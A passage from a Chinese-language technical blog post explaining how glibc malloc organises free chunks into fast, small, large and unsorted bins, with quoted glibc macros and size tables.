<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line">   FASTBIN_CONSOLIDATION_THRESHOLD is the size of a chunk <span class="keyword">in</span> free()</span><br><span class="line">   that triggers automatic consolidation of possibly-surrounding</span><br><span class="line">   fastbin chunks. This is a heuristic, so the exact value should not</span><br><span class="line">   matter too much. It is defined at half the default trim threshold as a</span><br><span class="line">   compromise heuristic to only attempt consolidation <span class="keyword">if</span> it is likely</span><br><span class="line">   to lead to trimming. However, it is not dynamically tunable, since</span><br><span class="line">   consolidation reduces fragmentation surrounding large chunks even</span><br><span class="line">   <span class="keyword">if</span> trimming is not used.</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line"><span class="comment">#define FASTBIN_CONSOLIDATION_THRESHOLD (65536UL)</span></span><br></pre></td></tr></table></figure>
<p>malloc_consolidate函数可以将fastbin中所有能和其它合并的chunk合并在一起。<br>具体地参见后续的详细函数的分析。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    Chunks in fastbins keep their inuse bit set, so they cannot</span></span><br><span class="line"><span class="comment">    be consolidated with other free chunks. malloc_consolidate</span></span><br><span class="line"><span class="comment">    releases all chunks in fastbins and consolidates them with</span></span><br><span class="line"><span class="comment">    other free chunks.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><strong>small bin</strong><br>small bins中每个chunk的大小与其所在的bin的index的关系为：chunk_size=2*SIZE_SZ<br>*index，具体如下</p>
<hr>
<p>下标          SIZE_SZ=4(32位)          SIZE_SZ=8(64位)<br>2                     16                                  32<br>3                     24                                  48<br>4                     32                                  64<br>5                     40                                  80<br>x                     2<em>4</em>x                              2<em>8</em>x<br>63                   504                                1008</p>
<hr>
<p>small bins中一共有62个循环双向链表，每个链表中存储的chunk大小都一致。比如对于32<br>位系统来说，下标2对应的双向链表中存储的chunk大小均为16个字节。每个链表都有链表头<br>结点，这样可以方便对于链表内部结点的管理。此外，small bins中每个Bin对应的链表采用<br>FIFO的规则，所以同一个链表中先被释放的chunk会先被分配出去。</p>
<p>small bin相关的宏如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NSMALLBINS 64</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SMALLBIN_WIDTH MALLOC_ALIGNMENT</span></span><br><span class="line"><span class="comment">// 是否需要对small bin的下标进行纠正</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SMALLBIN_CORRECTION (MALLOC_ALIGNMENT &gt; 2 * SIZE_SZ)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MIN_LARGE_SIZE ((NSMALLBINS - SMALLBIN_CORRECTION) * SMALLBIN_WIDTH)</span></span><br><span class="line"><span class="comment">//判断chunk的大小是否在small bin范围内</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> in_smallbin_range(sz)                                                  \</span></span><br><span class="line">    ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz) &lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) MIN_LARGE_SIZE)</span><br><span class="line"><span class="comment">// 根据chunk的大小得到small bin对应的索引。</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> smallbin_index(sz)                                                     \</span></span><br><span class="line">    ((SMALLBIN_WIDTH == <span class="number">16</span> ? (((<span class="keyword">unsigned</span>) (sz)) &gt;&gt; <span class="number">4</span>)                          \</span><br><span class="line">                           : (((<span class="keyword">unsigned</span>) (sz)) &gt;&gt; <span class="number">3</span>)) +                       \</span><br><span class="line">     SMALLBIN_CORRECTION)</span><br></pre></td></tr></table></figure>
<p>或许，大家会很疑惑，那fastbin与smallbin中的大小会有很大一部分重合啊，那smallbin中<br>对应大小的bin是不是就没有什么作用啊？其实不然，fastbin中的chunk是有可能被放到<br>smallbin中去的，我们在后面分析具体的源代码时会有深刻体会。</p>
<h3 id="Largebin"><a href="#Largebin" class="headerlink" title="Largebin"></a>Largebin</h3><p>largebins中一共包括63个bin，每一个bin中的chunk的大小不一致，而是处于一定区间范围<br>内。此外，这63个bin被分成了6组，每组bin中的chunk大小之间的公差一致，具体如下：</p>
<hr>
<p>组                     数量                 公差<br>1                        32                   64B<br>2                        16                   512B<br>3                         8                    4096B<br>4                         4                    32768B<br>5                         2                    262144B<br>6                         1                    不限制</p>
<hr>
<p>这里我们以32位平台的largebin为例，第一个largebin的起始chunk大小为512个字节，位于<br>第一组，所以该bin可以存储的chunk的大小范围为[512,512+64)</p>
<p>关于large bin的宏如下，这里我们以32位平台下，第一个largebin的起始chunk大小为例子，<br>为512字节，那么512&gt;&gt;6=8，所以其下标为56+8=64。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> largebin_index_32(sz)                                                  \</span></span><br><span class="line">    (((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">6</span>) &lt;= <span class="number">38</span>)                                     \</span><br><span class="line">         ? <span class="number">56</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">6</span>)                                  \</span><br><span class="line">         : ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">9</span>) &lt;= <span class="number">20</span>)                               \</span><br><span class="line">               ? <span class="number">91</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">9</span>)                            \</span><br><span class="line">               : ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">12</span>) &lt;= <span class="number">10</span>)                        \</span><br><span class="line">                     ? <span class="number">110</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">12</span>)                    \</span><br><span class="line">                     : ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">15</span>) &lt;= <span class="number">4</span>)                   \</span><br><span class="line">                           ? <span class="number">119</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">15</span>)              \</span><br><span class="line">                           : ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">18</span>) &lt;= <span class="number">2</span>)             \</span><br><span class="line">                                 ? <span class="number">124</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">18</span>)        \</span><br><span class="line">                                 : <span class="number">126</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> largebin_index_32_big(sz)                                              \</span></span><br><span class="line">    (((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">6</span>) &lt;= <span class="number">45</span>)                                     \</span><br><span class="line">         ? <span class="number">49</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">6</span>)                                  \</span><br><span class="line">         : ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">9</span>) &lt;= <span class="number">20</span>)                               \</span><br><span class="line">               ? <span class="number">91</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">9</span>)                            \</span><br><span class="line">               : ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">12</span>) &lt;= <span class="number">10</span>)                        \</span><br><span class="line">                     ? <span class="number">110</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">12</span>)                    \</span><br><span class="line">                     : ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">15</span>) &lt;= <span class="number">4</span>)                   \</span><br><span class="line">                           ? <span class="number">119</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">15</span>)              \</span><br><span class="line">                           : ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">18</span>) &lt;= <span class="number">2</span>)             \</span><br><span class="line">                                 ? <span class="number">124</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">18</span>)        \</span><br><span class="line">                                 : <span class="number">126</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// XXX It remains to be seen whether it is good to keep the widths of</span></span><br><span class="line"><span class="comment">// XXX the buckets the same or whether it should be scaled by a factor</span></span><br><span class="line"><span class="comment">// XXX of two as well.</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> largebin_index_64(sz)                                                  \</span></span><br><span class="line">    (((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">6</span>) &lt;= <span class="number">48</span>)                                     \</span><br><span class="line">         ? <span class="number">48</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">6</span>)                                  \</span><br><span class="line">         : ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">9</span>) &lt;= <span class="number">20</span>)                               \</span><br><span class="line">               ? <span class="number">91</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">9</span>)                            \</span><br><span class="line">               : ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">12</span>) &lt;= <span class="number">10</span>)                        \</span><br><span class="line">                     ? <span class="number">110</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">12</span>)                    \</span><br><span class="line">                     : ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">15</span>) &lt;= <span class="number">4</span>)                   \</span><br><span class="line">                           ? <span class="number">119</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">15</span>)              \</span><br><span class="line">                           : ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">18</span>) &lt;= <span class="number">2</span>)             \</span><br><span class="line">                                 ? <span class="number">124</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">18</span>)        \</span><br><span class="line">                                 : <span class="number">126</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> largebin_index(sz)                                                     \</span></span><br><span class="line">    (SIZE_SZ == <span class="number">8</span> ? largebin_index_64(sz) : MALLOC_ALIGNMENT == <span class="number">16</span>             \</span><br><span class="line">                                                ? largebin_index_32_big(sz)    \</span><br><span class="line">                                                : largebin_index_32(sz))</span><br></pre></td></tr></table></figure>
<h3 id="unsorted-bin"><a href="#unsorted-bin" class="headerlink" title="unsorted bin"></a>unsorted bin</h3><p>unsorted bin可以视为空闲chunk回归其所属bin之前的缓冲区。<br>其在glibc中具体的说明如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   Unsorted chunks</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    All remainders from chunk splits, as well as all returned chunks,</span></span><br><span class="line"><span class="comment">    are first placed in the &quot;unsorted&quot; bin. They are then placed</span></span><br><span class="line"><span class="comment">    in regular bins after malloc gives them ONE chance to be used before</span></span><br><span class="line"><span class="comment">    binning. So, basically, the unsorted_chunks list acts as a queue,</span></span><br><span class="line"><span class="comment">    with chunks being placed on it in free (and malloc_consolidate),</span></span><br><span class="line"><span class="comment">    and taken off (to be either used or placed in bins) in malloc.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    The NON_MAIN_ARENA flag is never set for unsorted chunks, so it</span></span><br><span class="line"><span class="comment">    does not have to be taken into account in size comparisons.</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure>
<p>从下面的宏我们可以看出</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* The otherwise unindexable 1-bin is used to hold unsorted chunks. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> unsorted_chunks(M) (bin_at(M, 1))</span></span><br></pre></td></tr></table></figure>
<p>unsorted bin 处于我们之前所说的bin数组下标1处。故而unsortedbin只有一个链表。<br>unsorted bin中空闲的chunk处于乱序状态，主要有两个来源<br>①当一个较大的chunk被分割成两半后，如果剩下的部分大于MINSIZE，就会被放到unsorted<br>bin中。<br>②释放一个不属于fast bin的chunk，并且该chunk不和top chunk紧邻时，该chunk会被放到<br>unsorted bin中。关于top chunk的解释，请参考下面的介绍。</p>
<p>此外，Unsorted bin在使用的过程中，采用的遍历顺序是FIFO。</p>
<h3 id="common-macro"><a href="#common-macro" class="headerlink" title="common macro"></a>common macro</h3><p>这里介绍一些通用的宏。<br>根据chunk的大小统一地获得chunk所在的索引</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#define bin_index(sz)                                                          \</span></span><br><span class="line">    ((in_smallbin_range(sz)) ? smallbin_index(sz) : largebin_index(sz))</span><br></pre></td></tr></table></figure>


      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/06/14/bin/" data-id="ckpxtnaaq0000xcu64x5b44so" data-title="Bin" class="article-share-link">分享</a>
      
      
      
    </footer>
  </div>
  
</article>



  


  <nav id="page-nav">
    
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/">下一页 &raquo;</a>
  </nav>

</section>
        
          <aside id="sidebar">
  
    

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">标签</h3>
    <div class="widget">
      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%9C%89%E7%82%B9%E6%83%85%E4%B8%8D%E8%87%AA%E7%A6%81%EF%BC%8C%E4%BD%86%E7%9A%86%E8%82%BA%E8%85%91%E4%B9%8B%E8%A8%80%EF%BC%8C%E6%9C%9B%E5%B9%BF%E5%A4%A7pwner%E6%90%BA%E8%B5%B7%E6%89%8B%E6%9D%A5%E4%B8%80%E8%B5%B7%E5%89%8D%E8%BF%9B/" rel="tag">有点情不自禁，但皆肺腑之言，望广大pwner携起手来一起前进</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">标签云</h3>
    <div class="widget tagcloud">
      <a href="/tags/%E6%9C%89%E7%82%B9%E6%83%85%E4%B8%8D%E8%87%AA%E7%A6%81%EF%BC%8C%E4%BD%86%E7%9A%86%E8%82%BA%E8%85%91%E4%B9%8B%E8%A8%80%EF%BC%8C%E6%9C%9B%E5%B9%BF%E5%A4%A7pwner%E6%90%BA%E8%B5%B7%E6%89%8B%E6%9D%A5%E4%B8%80%E8%B5%B7%E5%89%8D%E8%BF%9B/" style="font-size: 10px;">有点情不自禁，但皆肺腑之言，望广大pwner携起手来一起前进</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">归档</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/06/">六月 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/05/">五月 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/04/">四月 2021</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">最新文章</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2021/06/23/%E4%BA%8C%E8%BF%9B%E5%88%B6%E8%BD%AF%E4%BB%B6%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7%E5%8F%8A%E5%AE%9E%E6%88%98/">二进制软件逆向分析工具及实战</a>
          </li>
        
          <li>
            <a href="/2021/06/22/%E4%BA%8C%E8%BF%9B%E5%88%B6%E8%BD%AF%E4%BB%B6%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E5%9F%BA%E7%A1%80/">二进制软件逆向分析基础</a>
          </li>
        
          <li>
            <a href="/2021/06/20/%E5%88%86%E7%AE%B1%E5%BC%8F%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/">分箱式内存管理</a>
          </li>
        
          <li>
            <a href="/2021/06/20/PWN-shellcode%E7%BC%96%E5%86%99/">PWN-Shellcode编写</a>
          </li>
        
          <li>
            <a href="/2021/06/19/IO-FILE%E5%AD%A6%E4%B9%A0/">IO_FILE学习</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      
      &copy; 2021 Saku376<br>
      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>

    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    


<script src="/js/jquery-3.4.1.min.js"></script>



  
<script src="/fancybox/jquery.fancybox.min.js"></script>




<script src="/js/script.js"></script>





  </div>
</body>
</html>